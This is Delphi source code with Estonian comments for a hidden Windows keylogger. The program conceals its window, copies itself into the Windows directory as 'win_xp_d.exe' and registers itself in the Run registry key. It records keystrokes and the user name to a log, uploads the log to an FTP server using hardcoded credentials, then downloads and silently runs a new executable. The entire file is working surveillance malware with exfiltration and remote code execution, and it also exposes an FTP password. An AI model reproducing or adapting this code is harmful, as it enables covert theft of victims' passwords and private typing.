unit Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, Registry, Psock, NMFtp, ShellAPI;

type
  TForm1 = class(TForm)
    Timer1: TTimer;
    NMFTP1: TNMFTP;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure UploadFile;
    procedure NMFTP1Success(Trans_Type: TCmdType);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  valf: TextFile;
  tics: longint;
  reg: TRegistry;
  koht: string;
  ftpsent: boolean; {märgib, kas andmed saadetud}
  ftptics: word;
  flag: byte; {märgib parasjagu toimuvat ftp tegevust}
  user: array [0..255] of char;

implementation

{$R *.dfm}

procedure TForm1.UploadFile;
var fname, tmp: string; i: integer; ch: char;
begin
  fname:=DateTimeToStr(Now); tmp:='';
  for i:=1 to length(fname) do begin
    ch:=fname[i]; if (ch<>'.') and (ch<>' ') and (ch<>':') then tmp:=tmp +ch;
  end;
  try
    CloseFile(valf);
    NMFtp1.Upload(koht +'wl.log', 'wl' +tmp +'.log');
    Erase(valf);
    AssignFile(valf, koht +'wl.log');
    Rewrite(valf); {faili uuesti avamine}

    {uue versiooni kontrollimine}
    flag:=1;
    NMFtp1.Download('ver.txt', koht +'ver.txt');
  except
  end;

end;

function WindowsDirectory : String;
var Buffer : Array[0..Max_path] of char;
begin
  FillChar(Buffer,Max_Path + 1, 0);
  GetWindowsDirectory(Buffer,Max_path);
  Result := String(Buffer);
  if Result[Length(Result)] <> '\' then Result := Result + '\';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  ret: integer;
  i: integer;
begin
  inc(tics); inc(ftptics);
  Timer1.Enabled:=false;

  if not(ftpsent) then
  begin
    if ftptics>10000 then {umbes 100 sekundit pärast käivitamist ftp'sse saatmine}
    begin
      ftpsent:=true;
      UploadFile;
    end;
  end;

  if tics=1000 then
  begin
    tics:=0;
    Append(valf);
  end;
  if Form1.Visible then Form1.Hide;
  for i:=65 to 90 do
  begin
    ret:=word(GetAsyncKeyState(i));
    if word(GetAsyncKeyState(vk_SHIFT))>0 then
    begin
      if ret=32769 then write(valf, chr(i));
    end else
      if ret=32769 then write(valf, LowerCase(chr(i)));
  end;
  for i:=48 to 57 do
  begin
    ret:=word(GetAsyncKeyState(i));
    if ret=32769 then write(valf, chr(i));
  end;
  ret:=word(GetAsyncKeyState(ord('.')));
  if ret=32769 then write(valf, '.');

  ret:=word(GetAsyncKeyState(vk_return));
  if ret=32769 then writeln(valf);
                                               
  ret:=word(GetAsyncKeyState(vk_space));
  if ret=32769 then write(valf, ' ');

  Timer1.Enabled:=true;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
  user: array [0..255] of char;
  usize: dword;
begin
  Form1.Visible:=false;
  ftptics:=0;
  ftpsent:=false;

  {Programmi windowsi vms. kausta kirjutamine}
  {I-}
  koht:=WindowsDirectory;
  if not(fileexists(koht +'win_xp_d.exe')) then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(koht +'win_xp_d.exe'), true);
  end;

  {registrisse kirjutamine}
  reg:=TRegistry.Create;
  try
    Reg.RootKey:=HKEY_CURRENT_USER;
    if Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True) then
    begin
      Reg.WriteString('winsys','"' + koht + 'win_xp_d.exe"');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
    inherited;
  end;

  usize:=256;
  if not(GetUserName(user, usize)) then user:='tundmatu';

  AssignFile(valf, koht +'wl.log');
  if FileExists(koht +'wl.log') then Append(valf)
  else Rewrite(valf);
  Writeln(valf);
  Writeln(valf, 'Programm käivitatud: ' +DateToStr(now) +' ' +TimeToSTr(now));
  Writeln(valf, 'Kasutaja: ' +user);

  NMFtp1.Password:='PIOc5CJo'; {Ftp kasutaja seadistused}
  NMFtp1.Host:='ftp.zone.ee';
  NMFtp1.UserID:='cljim17';
  NMFtp1.Passive:=true;
  try
    NMFtp1.Connect;
  except
  end;
  tics:=0;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  {Programmi sulgemisel tehtavad toimingud}
  CloseFile(valf); {Väljundfaili sulgemine}
  try
    NMFtp1.Disconnect; {Ftp ühenduse katkestamine}
  except
  end;
end;

{Faili tõmbamise või saatmise lõpuga kaasnev action}
procedure TForm1.NMFTP1Success(Trans_Type: TCmdType);
var F: TextFile; ver: byte;
begin
  if (Trans_Type=cmdUpload) and (flag=1) then begin
    AssignFile(F, koht +'ver.txt'); Reset(F); {Versiooni määrav seade failis ver.txt}
    Read(F, ver);
    if ver=1 then begin {Uus versioon saadaval}
      flag:=2;
      try
        {Tõmbame uue versiooni}
        NMFtp1.Download('new.exe', koht +'new.exe');
      except
      end;
    end else try NMFtp1.Disconnect; except end;
    CloseFile(F);
    Erase(F);
  end;
  {Uue versiooni tõmbamise lõpp, käivitatakse see}
  if (Trans_Type=cmdUpload) and (flag=2) then begin
    ShellExecute(Form1.Handle, nil, PChar(koht +'new.exe'), nil, nil, SW_HIDE);
    flag:=0;
    try NMFtp1.Disconnect; except end;
  end;
end;

end.
